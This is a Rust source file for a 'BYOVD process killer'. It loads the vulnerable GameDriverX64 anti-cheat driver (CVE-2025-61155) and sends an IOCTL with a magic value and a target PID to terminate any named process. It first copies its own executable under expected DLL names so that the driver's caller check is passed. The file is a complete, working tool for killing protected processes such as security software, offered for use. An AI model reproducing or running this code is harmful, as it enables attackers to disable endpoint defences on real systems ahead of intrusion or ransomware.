use byovd_lib::{DriverConfig, Result};
use clap::Parser;
use std::ffi::CString;
use winapi::um::libloaderapi::LoadLibraryA;

// ============================================================================
// Driver Configuration - GameDriverX64
// CVE-2025-61155
// ============================================================================

struct IoctlInput {
    magic: u32,
    pid: u32,
}

struct GameDriverX64Driver;

impl DriverConfig for GameDriverX64Driver {
    fn driver_name(&self) -> &str {
        "GameDriverX64"
    }

    fn driver_file(&self) -> &str {
        "GameDriverX64.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\HtAntiCheatDriver"
    }

    fn ioctl_code(&self) -> u32 {
        0x222040
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        let input = IoctlInput {
            magic: 0xFA123456,
            pid,
        };
        let mut bytes = Vec::new();
        bytes.extend_from_slice(&input.magic.to_ne_bytes());
        bytes.extend_from_slice(&input.pid.to_ne_bytes());
        bytes
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "GameDriverX64-Killer", version, author = "BlackSnufkin, wwwab")]
#[command(about = "BYOVD process killer using GameDriverX64 (CVE-2025-61155)")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();

    let currect_exe = std::env::current_exe()?;
    let new_name1 = "QmGUI4.dll";
    let new_name2 = "QmGUI.dll";
    let new_name3 = "gameuirender.dll";

    for dll_name in [new_name1, new_name2, new_name3] {
        std::fs::copy(&currect_exe, dll_name)?;
        let dll_cstr = CString::new(dll_name).expect("dll name had interior nulls");
        unsafe {
            // Load renamed copies to satisfy driver expectations.
            LoadLibraryA(dll_cstr.as_ptr());
        }
    }

    byovd_lib::run(&GameDriverX64Driver, &cli.process_name, None)
}
